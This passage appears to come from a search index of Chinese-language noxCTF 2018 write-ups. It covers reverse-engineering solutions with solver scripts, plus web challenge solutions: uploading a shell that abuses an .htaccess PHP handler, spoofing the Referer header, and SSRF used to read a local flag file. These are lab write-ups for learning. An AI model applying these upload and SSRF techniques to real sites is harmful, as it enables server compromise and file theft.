0x1b , 0x54 , 0x33 , 0x55 , 0x1a , 0x5f , 0x72 , 0x45 , 0x0a , 0x4c }; for ( int i = 63 ; i >= 0 ;) { BYTE v3 = g_array1 [ i % 4 ]; int v4 = i -- ; char c = v3 ^ g_array2 [ v4 ]; szFlag [ i + 1 ] = c ; printf ( \"%c\" , c ); } \u4f46\u662f\u5f97\u5230\u7684\u7ed3\u679c\u4e3a noxTF{Fake password.. Find something else inside the binary} \u5e76\u4e0d\u662f\u6539\u7a0b\u5e8f\u6b63\u786e\u7684key\u3002 \u4ed4\u7ec6\u67e5\u770b\u7a0b\u5e8f\uff0c0x00401560\u5b58\u5728\u4e00\u4e2a\u672a\u4f7f\u7528\u7684\u51fd\u6570\u3002\u5206\u6790\u8be5\u51fd\u6570\uff0c\u662f\u5148\u521d\u59cb\u5316\u4e00\u5757\u5c40\u90e8\u53d8\u91cfbuf\uff0c\u7136\u540e\u5224\u65ad\u8fd9\u5757buf\u7684\u5f00\u59344\u5b57\u8282\u662f\u5426\u4e3a0x55 ,0x89,0xe5,0x60\uff0c\u7136\u540e\u5bf9\u8fd9\u5757buf\u8fdb\u884c\u4e86\u4e00\u4e9b\u4fee\u6539\u64cd\u4f5c\uff0c\u7136\u540e\u7533\u8bf7\u4e00\u5757\u53ef\u6267\u884c\u5185\u5b58\u62f7\u8d1d\u8fc7\u53bb\u8fd0\u884c\uff0c\u90a3\u4e48\u6211\u4eec\u731c\u6d4b\u8fd9\u5757\u5185\u5b58\u662f\u4e00\u6bb5\u53ef\u6267\u884c\u4ee3\u7801\uff0c\u4f7f\u7528\u4e0a\u9762\u7684\u89e3\u5bc6\u51fd\u6570\uff0c\u5bf9\u8fd9\u5757buf\u8fdb\u884c\u89e3\u5bc6\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u5982\u4e0b: 00030000 55 push ebp 00030001 89E5 mov ebp , esp 00030003 60 pushad 00030004 31 C0 xor eax , eax 00030006 BE AEF92800 mov esi , 0x28F9AE ; ASCII \"yxoCQl_&ss$yHQBYt &'y\" H # e $ HT '' & 6 j \" 0003000 B BF AEF92800 mov edi , 0x28F9AE ; ASCII \"yxoCQl_&ss$yHQBYt &'y\" H # e $ HT '' & 6 j \" 00030010 AC lods byte ptr ds :[ esi ] 00030011 84 C0 test al , al 00030013 74 05 je short 0003001 A 00030015 34 17 xor al , 0x17 00030017 AA stos byte ptr es :[ edi ] 0003001 8 ^ EB F6 jmp short 00030010 0003001 A 61 popad 0003001 B 89 EC mov esp , ebp 0003001 D 5 D pop ebp 0003001 E C3 ret \u6700\u540ecall eax\u8df3\u5165\u6267\u884c\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u5c31\u662f\u6b63\u786e\u7684flag\u3002 noxTF{H1dd3n_FUNc710n5_4r3_C001!}","title":"Att3nti0n"},{"location":"noxCTF2018/reverse/GuessTheString/writeup/","text":"Guess the string \u00b6 ida\u6253\u5f00\u770b\u4e0b\uff0c\u6ee1\u8db3\u7a0b\u5e8f\u7684\u6240\u6709\u6761\u4ef6\u5373\u53ef\u5f97\u5230flag\u3002 _BOOL8 __fastcall O0000OOO00 ( __int64 a1 , int a2 ) { char v2 ; // dl char v3 ; // dl return ( unsigned int ) O0OO0O0O0O (( const char * ) a1 ) && ( unsigned int ) OOO00O0O00 ( a1 ) && ( unsigned int ) O0OO0O0O00 ( a1 ) && ( unsigned int ) O000O00O00 ( a1 ) && ( unsigned int ) OO000OO000 ( a1 ) && ( unsigned int ) O0OO0O00OO ( a1 ) && ( unsigned int ) OOO00O00O0 ( a1 ) && ( unsigned int ) OO00O0O000 ( a1 ) && ( unsigned int ) O00OOOO000 ( a1 , a2 , v2 ) && ( unsigned int ) OOOOO00O00 ( a1 ) && ( unsigned int ) O00OO0O0OO ( a1 , a2 , v3 ); } \u7f57\u5217\u4e00\u4e0b\uff1a \u957f\u5ea611 ascii>32 szIn[0]\uff01=B szIn[0]*szIn[1] = 0xd96 ((szIn[1] ^ szIn[0]) ^ szIn[2]) = 0x31 (char)szIn[3] > (char)szIn[2] szIn[2] * szIn[2] == szIn[3] * szIn[3] \u540e\u9762\u7528\u5230\u4e00\u4e2a\u51fd\u6570 BOOL CheckNo0 ( BYTE bIn ) { signed int i ; // [rsp+Ch] [rbp-8h] unsigned int v3 ; // [rsp+10h] [rbp-4h] v3 = 1 ; if ( bIn > 1u ) { if ( bIn > 2u ) { for ( i = 2 ; v3 && i < bIn ; ++ i ) { if ( ! ( bIn % i ) ) v3 = 0 ; } } } else { v3 = 0 ; } return v3 ; } \u76f4\u63a5\u6284\u4e0b\u6765\u7528\u4e86\uff0c\u5176\u5b9e\u5c31\u662f\u5224\u65ad\u662f\u5426\u4e3a\u8d28\u6570 szIn[4] szIn[5]\u662f\u8d28\u6570\u5e76\u4e14 szIn[4] ^ szIn[5]) == 126 CheckNo0((char)szIn[6] / 2) (char)szIn[6] == 2 * ((char)szIn[5] - 42) szIn[7] > 47 szIn[7] <= 57 4 * (char)((char)szIn[7] >> 2) == (char)szIn[7] szIn[8] == (a1 ^ szIn[7]) 2 * szIn[8] == szIn[9] #!/usr/bin/env python3 primes = [] for i in range ( 2 , 256 ): for j in range ( 2 , i ): if i % j == 0 : break else : primes . append ( i ) s = [ 0 ] * 11 s [ 0 ] = 47 s [ 1 ] = 74 assert ( s [ 0 ] * s [ 1 ] == 3478 ) s [ 2 ] = s [ 0 ] ^ s [ 1 ] ^ 49 for i in range ( s [ 2 ] + 1 , 256 ): if i * i % 256 == s [ 2 ] * s [ 2 ] % 256 : s [ 3 ] = i break def get456 (): for i in primes : for j in primes : if i > 32 and j > 32 and ( i ^ j ) % 256 == 126 : if j - 42 in primes and 2 * j < 256 : return ( i , j , 2 * ( j - 42 )) s [ 4 ], s [ 5 ], s [ 6 ] = get456 () for i in range ( 48 , 58 ): if 4 * ( i >> 2 ) == i : s [ 7 ] = i break s [ 8 ] = 0x12 ^ s [ 7 ] s [ 9 ] = 2 * s [ 8 ] s [ 10 ] = 0x7a for c in s : assert ( c > 32 ) print ( '' . join ( map ( chr , s )))","title":"GuessTheString"},{"location":"noxCTF2018/reverse/GuessTheString/writeup/#guess-the-string","text":"ida\u6253\u5f00\u770b\u4e0b\uff0c\u6ee1\u8db3\u7a0b\u5e8f\u7684\u6240\u6709\u6761\u4ef6\u5373\u53ef\u5f97\u5230flag\u3002 _BOOL8 __fastcall O0000OOO00 ( __int64 a1 , int a2 ) { char v2 ; // dl char v3 ; // dl return ( unsigned int ) O0OO0O0O0O (( const char * ) a1 ) && ( unsigned int ) OOO00O0O00 ( a1 ) && ( unsigned int ) O0OO0O0O00 ( a1 ) && ( unsigned int ) O000O00O00 ( a1 ) && ( unsigned int ) OO000OO000 ( a1 ) && ( unsigned int ) O0OO0O00OO ( a1 ) && ( unsigned int ) OOO00O00O0 ( a1 ) && ( unsigned int ) OO00O0O000 ( a1 ) && ( unsigned int ) O00OOOO000 ( a1 , a2 , v2 ) && ( unsigned int ) OOOOO00O00 ( a1 ) && ( unsigned int ) O00OO0O0OO ( a1 , a2 , v3 ); } \u7f57\u5217\u4e00\u4e0b\uff1a \u957f\u5ea611 ascii>32 szIn[0]\uff01=B szIn[0]*szIn[1] = 0xd96 ((szIn[1] ^ szIn[0]) ^ szIn[2]) = 0x31 (char)szIn[3] > (char)szIn[2] szIn[2] * szIn[2] == szIn[3] * szIn[3] \u540e\u9762\u7528\u5230\u4e00\u4e2a\u51fd\u6570 BOOL CheckNo0 ( BYTE bIn ) { signed int i ; // [rsp+Ch] [rbp-8h] unsigned int v3 ; // [rsp+10h] [rbp-4h] v3 = 1 ; if ( bIn > 1u ) { if ( bIn > 2u ) { for ( i = 2 ; v3 && i < bIn ; ++ i ) { if ( ! ( bIn % i ) ) v3 = 0 ; } } } else { v3 = 0 ; } return v3 ; } \u76f4\u63a5\u6284\u4e0b\u6765\u7528\u4e86\uff0c\u5176\u5b9e\u5c31\u662f\u5224\u65ad\u662f\u5426\u4e3a\u8d28\u6570 szIn[4] szIn[5]\u662f\u8d28\u6570\u5e76\u4e14 szIn[4] ^ szIn[5]) == 126 CheckNo0((char)szIn[6] / 2) (char)szIn[6] == 2 * ((char)szIn[5] - 42) szIn[7] > 47 szIn[7] <= 57 4 * (char)((char)szIn[7] >> 2) == (char)szIn[7] szIn[8] == (a1 ^ szIn[7]) 2 * szIn[8] == szIn[9] #!/usr/bin/env python3 primes = [] for i in range ( 2 , 256 ): for j in range ( 2 , i ): if i % j == 0 : break else : primes . append ( i ) s = [ 0 ] * 11 s [ 0 ] = 47 s [ 1 ] = 74 assert ( s [ 0 ] * s [ 1 ] == 3478 ) s [ 2 ] = s [ 0 ] ^ s [ 1 ] ^ 49 for i in range ( s [ 2 ] + 1 , 256 ): if i * i % 256 == s [ 2 ] * s [ 2 ] % 256 : s [ 3 ] = i break def get456 (): for i in primes : for j in primes : if i > 32 and j > 32 and ( i ^ j ) % 256 == 126 : if j - 42 in primes and 2 * j < 256 : return ( i , j , 2 * ( j - 42 )) s [ 4 ], s [ 5 ], s [ 6 ] = get456 () for i in range ( 48 , 58 ): if 4 * ( i >> 2 ) == i : s [ 7 ] = i break s [ 8 ] = 0x12 ^ s [ 7 ] s [ 9 ] = 2 * s [ 8 ] s [ 10 ] = 0x7a for c in s : assert ( c > 32 ) print ( '' . join ( map ( chr , s )))","title":"Guess the string"},{"location":"noxCTF2018/reverse/avatar/writeup/","text":"\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u4e86stl\uff0c\u5b58\u57284\u6bb5check \u7b2c\u4e00\u6bb5\u662f\u4e00\u4e2aaes\uff0c\u89e3\u5bc6\u5982\u4e0b\uff1a BYTE key [] = { 0x2F , 0xDF , 0x09 , 0x58 , 0x4E , 0xAC , 0x6B , 0x77 , 0xF4 , 0xDB , 0x7F , 0x7B , 0xF7 , 0x99 , 0x9C , 0x20 , 0xFF , 0x80 , 0xCF , 0x0C , 0x7C , 0x2A , 0x29 , 0xCC , 0xD6 , 0xC7 , 0x0C , 0xBD , 0x13 , 0xD1 , 0x40 , 0xB0 }; aes_context ctx ; unsigned char iv [ 16 * 10 ]; memset ( & iv , 0 , sizeof ( iv )); BYTE szEnStr [] = { 0xFF , 0x80 , 0xCF , 0x0C , 0x7C , 0x2A , 0x29 , 0xCC , 0xD6 , 0xC7 , 0x0C , 0xBD , 0x13 , 0xD1 , 0x40 , 0xB0 }; //\u89e3\u5bc6 char szdeStr [ 1024 ] = { 0 }; memset ( & iv , 0 , sizeof ( iv ) ); aes_setkey_dec ( & ctx , ( const unsigned char * ) key , 128 ); int nLen = 32 ; aes_crypt_cbc ( & ctx , AES_DECRYPT , nLen , iv ,( const unsigned char * ) & szEnStr , ( unsigned char * ) & szdeStr ); printf ( \"\u89e3\u5bc6\u540e\u6570\u636e\uff1a%s \\n \" , szdeStr ); \u7b2c\u4e8c\u6bb5\u4ecemap\u4e2d\u53d6\u4e86\u5bf9\u5e94\u7684\u5b57\u8282\u7136\u540e\u505a\u4e86\u53d8\u5e8f\u8fd0\u7b97\uff0c\u7136\u540e\u8ddf\u56fa\u5b9abuf\u6bd4\u8f83,map\u521d\u59cb\u5316\u6570\u636e\u57280564838\u5904\u3002 def mkmap (): r = {} s = [ 0x42 , 0xf8 , 0x64 , 0xd0 , 0x68 , 0xe3 , 0x6c , 0xb6 , 0x6e , 0x85 , 0x31 , 0xf5 , 0x30 , 0xb7 , 0x33 , 0xc8 , 0x54 , 0x88 , 0x5f , 0xe8 ] for i in range ( 0 , len ( s ) / 2 ): r [ s [ i * 2 + 1 ]] = s [ i * 2 ] return r r1 = bytearray ([ 0xe8 , 0xb6 , 0xf5 , 0xc8 , 0x85 , 0xe3 , 0xc8 , 0xf8 , 0xe8 , 0x85 , 0x88 , 0xb7 , 0xd0 ]) r1 = xchg ( r1 , 4 , 10 ) r1 = r1 [ - 3 :] + r1 [: - 3 ] r1 = xchg ( r1 , 11 , 10 ) r1 = xchg ( r1 , 0 , 5 ) r1 = xchg ( r1 , 4 , 1 ) r1 = r1 [ 7 :] + r1 [: 7 ] r1 = xchg ( r1 , 5 , 7 ) r1 = xchg ( r1 , 2 , 0xc ) mp = mkmap () for i in range ( 0 , len ( r1 )): if r1 [ i ]: r1 [ i ] = mp [ r1 [ i ]] r . sendlineafter ( \"Earth Kingdom:\" , str ( r1 )) # Th3_Bl1nd_0n3 \u7b2c\u4e09\u6bb5\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\u6c42\u89e3\uff0c\u53ef\u5b58\u5728\u591a\u4e2a\u89e3 bool __fastcall Check3333333333333333333333333333333333333333333333333333333 ( char * szIn ) { return ((( 14 * ((( std :: __cxx11 :: stoll ( szIn , '\\0' , 16LL ) | 0x40 ) - 0x5336654 + 0x1E240 ) | 0x10000 ) >> 1 ) - 0x3B93AE7C ) & 0xFFFFFFFFFFFF7FFFLL ^ 0x6E988 ) == 0x1CDEDC990D1LL ; } from z3 import * import os solver = Solver () source = BitVec ( 'source' , 64 ) x = Int ( 'x' ) solver . add (((( 14 * ((( source | 0x40 ) - 87254612 + 123456 ) | 0x10000 ) >> 1 ) - 999534204 ) & 0xFFFFFFFFFFFF7FFF ^ 0x6E988 ) == 1983969333457 ) while 1 : if solver . check () != sat : break result = solver . model ()[ source ] . as_long () print hex ( result ) solver . add ( source != result ) \u5f97\u5230\u7684\u89e3\u5176\u4e2d\u4e00\u4e2a\u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e09\u6bb5\u9a8c\u8bc1\u3002 \u7b2c\u56db\u6bb5\u662f\u5c06\u8f93\u5165\u505a\u54c8\u5e0c\uff0c\u5206\u4e3a6\u6bb5\u518d\u8ba1\u7b97\u54c8\u5e0c\uff0c\u5206\u522b\u6bd4\u8f83\u3002 3c9314956b8ecf32f6745a3d7b98338f6b48b584c5e1250feb3e79bfb2a6d5c7 a76857 f288534efaf4c06262adea0158526b3bd2985b7a2112a30dadaf9eaa90ad9701 f5cbff 7e0f334f9a5012575aeceec44686b102cf8849ab32cd797f157f09961041231a 7d4a83 f84a58f150a0d9cb21c67ec27970f9cad863c76be773c8417650d63c13352e66 60602b 27fe87f345ea08a26e8f732f5120e2ef419b9a03a6ef14e8f18a3b83bd41a81c da247a 8bd574fdb05c2dc5017188a2f4c32d5b81963e0a33eccba92404e968c665006d fd \u5728\u8ba1\u7b97\u4e00\u6b21\uff1a a76857f5cbff7d4a8360602bda247afd MD5 : B41dy \u5206\u522b\u8f93\u5165\u5f97\u5230\u6b63\u786e\u7684flag\uff1a noxCTF{Fu11_M00n-Th3_Bl1nd_0n3-420B1B2E57-B41dy}","title":"avatar"},{"location":"noxCTF2018/web/MyFileUploader/writeup/","text":"MyFileUploder \u00b6 \u968f\u4fbf\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u540e\u7ed9\u51fa\u4e86\u6587\u4ef6\u4e0a\u4f20\u540e\u7684\u5730\u5740\uff0c\u8bbf\u95ee\u540e\u53d1\u73b0\u5728 uploads \u6587\u4ef6\u5939\u4e0b \u53bb\u6389\u6587\u4ef6\u540d\u53d1\u73b0 uploads \u6587\u4ef6\u5939\u53ef\u4ee5\u5217\u76ee\u5f55 \u8bbf\u95ee htaccess \u6587\u4ef6\u5f97\u5230\u4ee5\u4e0b\u5185\u5bb9 \u8bbf\u95ee Don't open \u6587\u4ef6\u5939\u540e\u53d1\u73b0\u5b58\u5728htaccess\u6587\u4ef6\uff0c\u5185\u5bb9\u4e3a Options +Indexes AddType application/x-httpd-php .cyb3r \u4e8e\u662f\u6784\u9020\u4e00\u4e2a\u6587\u4ef6\u540d\u4e3a 1.jpg.cyb3r \u7684shell\uff0c\u5728 7H3-FL4G-1S-H3r3 \u76ee\u5f55\u4e2d\u627e\u5230flag","title":"MyFileUploader"},{"location":"noxCTF2018/web/MyFileUploader/writeup/#myfileuploder","text":"\u968f\u4fbf\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u540e\u7ed9\u51fa\u4e86\u6587\u4ef6\u4e0a\u4f20\u540e\u7684\u5730\u5740\uff0c\u8bbf\u95ee\u540e\u53d1\u73b0\u5728 uploads \u6587\u4ef6\u5939\u4e0b \u53bb\u6389\u6587\u4ef6\u540d\u53d1\u73b0 uploads \u6587\u4ef6\u5939\u53ef\u4ee5\u5217\u76ee\u5f55 \u8bbf\u95ee htaccess \u6587\u4ef6\u5f97\u5230\u4ee5\u4e0b\u5185\u5bb9 \u8bbf\u95ee Don't open \u6587\u4ef6\u5939\u540e\u53d1\u73b0\u5b58\u5728htaccess\u6587\u4ef6\uff0c\u5185\u5bb9\u4e3a Options +Indexes AddType application/x-httpd-php .cyb3r \u4e8e\u662f\u6784\u9020\u4e00\u4e2a\u6587\u4ef6\u540d\u4e3a 1.jpg.cyb3r \u7684shell\uff0c\u5728 7H3-FL4G-1S-H3r3 \u76ee\u5f55\u4e2d\u627e\u5230flag","title":"MyFileUploder"},{"location":"noxCTF2018/web/Reference/writeup/","text":"Reference \u00b6 \u8bbf\u95ee\u9875\u9762\u540e\u6253\u5370\u4e86\u4e00\u53e5\u8bdd\uff1a where the **** did you come from? \u7136\u540e\u67e5\u770b\u6e90\u7801\u53d1\u73b0 index.js $ ( document ). ready ( function () { $ . ajax ({ url : \"check_from_google\" , data : NaN , success : function ( result ) { $ ( \"#status\" ). html ( \"hello old friend! \" + atob ( result )) }, dataType : NaN }). fail ( function () { $ ( \"#status\" ). html ( \"where the **** did you come from?\" ) }); }); \u770b\u5230\u8bf7\u6c42\u7684url\u4e3a: check_from_google \uff0c \u731c\u60f3\u9700\u8981\u4fee\u6539\u6765\u6e90\u9875\u4e3agoogle\uff0c\u4f7f\u7528burpsuite\u4fee\u6539\u540e\u770b\u5230\u4e00\u4e32\u5b57\u7b26\u4e32 base64\u89e3\u7801\u540e\u5f97\u5230flag","title":"Reference"},{"location":"noxCTF2018/web/Reference/writeup/#reference","text":"\u8bbf\u95ee\u9875\u9762\u540e\u6253\u5370\u4e86\u4e00\u53e5\u8bdd\uff1a where the **** did you come from? \u7136\u540e\u67e5\u770b\u6e90\u7801\u53d1\u73b0 index.js $ ( document ). ready ( function () { $ . ajax ({ url : \"check_from_google\" , data : NaN , success : function ( result ) { $ ( \"#status\" ). html ( \"hello old friend! \" + atob ( result )) }, dataType : NaN }). fail ( function () { $ ( \"#status\" ). html ( \"where the **** did you come from?\" ) }); }); \u770b\u5230\u8bf7\u6c42\u7684url\u4e3a: check_from_google \uff0c \u731c\u60f3\u9700\u8981\u4fee\u6539\u6765\u6e90\u9875\u4e3agoogle\uff0c\u4f7f\u7528burpsuite\u4fee\u6539\u540e\u770b\u5230\u4e00\u4e32\u5b57\u7b26\u4e32 base64\u89e3\u7801\u540e\u5f97\u5230flag","title":"Reference"},{"location":"noxCTF2018/web/hiddenDOM/writeup/","text":"hiddenDOM \u00b6 \u770b\u5230\u662f\u4e00\u4e2a\u8bf7\u6c42\u8fde\u63a5\uff0c\u4e8e\u662f\u76f4\u63a5\u8bf7\u6c42 http://127.0.0.1 \u6d4b\u8bd5\u662f\u5426SSRF \u53d1\u73b0\u6709\u8fd4\u56de\uff0c\u4f46\u662f\u5185\u5bb9\u5374\u4e0d\u5b8c\u6574\uff0c\u67e5\u770b\u4e86\u4e00\u4e0b\u5f53\u524d\u9875\u9762\u6e90\u7801\uff0c\u53d1\u73b0\u6709\u4e00\u4e2a\u5143\u7d20 < a href = '/var/www/html/flag.txt' hidden > -_- </ a > \u8fd9\u6837\u5dee\u4e0d\u591a\u5c31\u80fd\u786e\u5b9a\u662fssrf\uff0c\u4f46\u662f\u76f4\u63a5 file \u534f\u8bae\u8bfb\u53d6\u8fd4\u56de\u7a7a \u6ce8\u610f\u5230\u6e90\u7801\u4e2d\u8fd8\u6709\u4e00\u6bb5JS var _0x3bc3 = [ \"\\x6D\\x61\\x69\\x6E\\x5F\\x66\\x6F\\x72\\x6D\" , \"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\" , \"\\x69\\x6E\\x70\\x75\\x74\" , \"\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\" , \"\\x6E\\x61\\x6D\\x65\" , \"\\x65\\x78\\x70\\x72\\x65\\x73\\x73\\x69\\x6F\\x6E\" , \"\\x73\\x65\\x74\\x41\\x74\\x74\\x72\\x69\\x62\\x75\\x74\\x65\" , \"\\x74\\x79\\x70\\x65\" , \"\\x74\\x65\\x78\\x74\" , \"\\x70\\x6C\\x61\\x63\\x65\\x68\\x6F\\x6C\\x64\\x65\\x72\" , \"\\x2F\\x3C\\x5B\\x5E\\x3C\\x3E\\x5D\\x7B\\x31\\x2C\\x7D\\x68\\x69\\x64\\x64\\x65\\x6E\\x5B\\x5E\\x3C\\x3E\\x5D\\x7B\\x31\\x2C\\x7D\\x3E\\x2F\" ]; var _frss = document [ _0x3bc3 [ 1 ]]( _0x3bc3 [ 0 ]); var _xEger = document [ _0x3bc3 [ 3 ]]( _0x3bc3 [ 2 ]); _xEger [ _0x3bc3 [ 6 ]]( _0x3bc3 [ 4 ], _0x3bc3 [ 5 ]); _xEger [ _0x3bc3 [ 6 ]]( _0x3bc3 [ 7 ], _0x3bc3 [ 8 ]); _xEger [ _0x3bc3 [ 6 ]]( _0x3bc3 [ 9 ], _0x3bc3 [ 10 ]) \u89e3\u7801\u4e00\u4e0b\u5f97\u5230 var _0x3bc3 = [ \"main_form\" , \"getElementById\" , \"input\" , \"createElement\" , \"name\" , \"expression\" , \"setAttribute\" , \"type\" , \"text\" , \"placeholder\" , \"/<[^<>]{1,}hidden[^<>]{1,}>/\" ] var _frss = document [ \"getElementById\" ]( \"main_form\" ); var _xEger = document [ \"createElement\" ]( \"input\" ); _xEger [ \"setAttribute\" ]( \"name\" , \"expression\" ); _xEger [ \"setAttribute\" ]( \"type\" , \"text\" ); _xEger [ \"setAttribute\" ]( \"placeholder\" , \"/<[^<>]{1,}hidden[^<>]{1,}>/\" ); \u5dee\u4e0d\u591a\u53ef\u4ee5\u770b\u5230\u8fd9\u6bb5js\u662f\u521b\u5efa\u4e86\u4e00\u4e2ainput <form id=\"main_form\" action=\"index.php\" style=\"position:sticky;\"> <input name=\"expression\" placeholder=\"/<[^<>]{1,}hidden[^<>]{1,}>/\" type=\"text\"> \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230 expression \u7684\u5b57\u6bb5\uff0c\u662f\u7528\u6765\u67e5\u627ehidden\u5143\u7d20\u7684\uff0c\u800c\u4e14\u662f\u4f7f\u7528\u4e86\u8fd9\u4e2a\u6b63\u5219\u6765\u8fdb\u884c\u67e5\u8be2\uff0c\u90a3\u4e48\u4f20\u5165 expression \u8fd9\u4e2a\u53c2\u6570\uff0c\u4fee\u6539\u4e00\u4e0b\u6b63\u5219\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230flag\u4e86","title":"hiddenDOM"},{"location":"noxCTF2018/web/hiddenDOM/writeup/#hiddendom","text":"\u770b\u5230\u662f\u4e00\u4e2a\u8bf7\u6c42\u8fde\u63a5\uff0c\u4e8e\u662f\u76f4\u63a5\u8bf7\u6c42 http://127.0.0.1 \u6d4b\u8bd5\u662f\u5426SSRF \u53d1\u73b0\u6709\u8fd4\u56de\uff0c\u4f46\u662f\u5185\u5bb9\u5374\u4e0d\u5b8c\u6574\uff0c\u67e5\u770b\u4e86\u4e00\u4e0b\u5f53\u524d\u9875\u9762\u6e90\u7801\uff0c\u53d1\u73b0\u6709\u4e00\u4e2a\u5143\u7d20 < a href = '/var/www/html/flag.txt' hidden > -_- </ a > \u8fd9\u6837\u5dee\u4e0d\u591a\u5c31\u80fd\u786e\u5b9a\u662fssrf\uff0c\u4f46\u662f\u76f4\u63a5 file \u534f\u8bae\u8bfb\u53d6\u8fd4\u56de\u7a7a \u6ce8\u610f\u5230\u6e90\u7801\u4e2d\u8fd8\u6709\u4e00\u6bb5JS var _0x3bc3 = [ \"\\x6D\\x61\\x69\\x6E\\x5F\\x66\\x6F\\x72\\x6D\" , \"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\" , \"\\x69\\x6E\\x70\\x75\\x74\" , \"\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\" , \"\\x6E\\x61\\x6D\\x65\" , \"\\x65\\x78\\x70\\x72\\x65\\x73\\x73\\x69\\x6F\\x6E\" , \"\\x73\\x65\\x74\\x41\\x74\\x74\\x72\\x69\\x62\\x75\\x74\\x65\" , \"\\x74\\x79\\x70\\x65\" , \"\\x74\\x65\\x78\\x74\" , \"\\x70\\x6C\\x61\\x63\\x65\\x68\\x6F\\x6C\\x64\\x65\\x72\" , \"\\x2F\\x3C\\x5B\\x5E\\x3C\\x3E\\x5D\\x7B\\x31\\x2C\\x7D\\x68\\x69\\x64\\x64\\x65\\x6E\\x5B\\x5E\\x3C\\x3E\\x5D\\x7B\\x31\\x2C\\x7D\\x3E\\x2F\" ]; var _frss = document [ _0x3bc3 [ 1 ]]( _0x3bc3 [ 0 ]); var _xEger = document [ _0x3bc3 [ 3 ]]( _0x3bc3 [ 2 ]); _xEger [ _0x3bc3 [ 6 ]]( _0x3bc3 [ 4 ], _0x3bc3 [ 5 ]); _xEger [ _0x3bc3 [ 6 ]]( _0x3bc3 [ 7 ], _0x3bc3 [ 8 ]); _xEger [ _0x3bc3 [ 6 ]]( _0x3bc3 [ 9 ], _0x3bc3 [ 10 ]) \u89e3\u7801\u4e00\u4e0b\u5f97\u5230 var _0x3bc3 = [ \"main_form\" , \"getElementById\" , \"input\" , \"createElement\" , \"name\" , \"expression\" , \"setAttribute\" , \"type\" , \"text\" , \"placeholder\" , \"/<[^<>]{1,}hidden[^<>]{1,}>/\" ] var _frss = document [ \"getElementById\" ]( \"main_form\" ); var _xEger = document [ \"createElement\" ]( \"input\" ); _xEger [ \"setAttribute\" ]( \"name\" , \"expression\" ); _xEger [ \"setAttribute\" ]( \"type\" , \"text\" ); _xEger [ \"setAttribute\" ]( \"placeholder\" , \"/<[^<>]{1,}hidden[^<>]{1,}>/\" ); \u5dee\u4e0d\u591a\u53ef\u4ee5\u770b\u5230\u8fd9\u6bb5js\u662f\u521b\u5efa\u4e86\u4e00\u4e2ainput <form id=\"main_form\" action=\"index.php\" style=\"position:sticky;\"> <input name=\"expression\" placeholder=\"/<[^<>]{1,}hidden[^<>]{1,}>/\" type=\"text\"> \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230 expression \u7684\u5b57\u6bb5\uff0c\u662f\u7528\u6765\u67e5\u627ehidden\u5143\u7d20\u7684\uff0c\u800c\u4e14\u662f\u4f7f\u7528\u4e86\u8fd9\u4e2a\u6b63\u5219\u6765\u8fdb\u884c\u67e5\u8be2\uff0c\u90a3\u4e48\u4f20\u5165 expression \u8fd9\u4e2a\u53c2\u6570\uff0c\u4fee\u6539\u4e00\u4e0b\u6b63\u5219\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230flag\u4e86","title":"hiddenDOM"}]}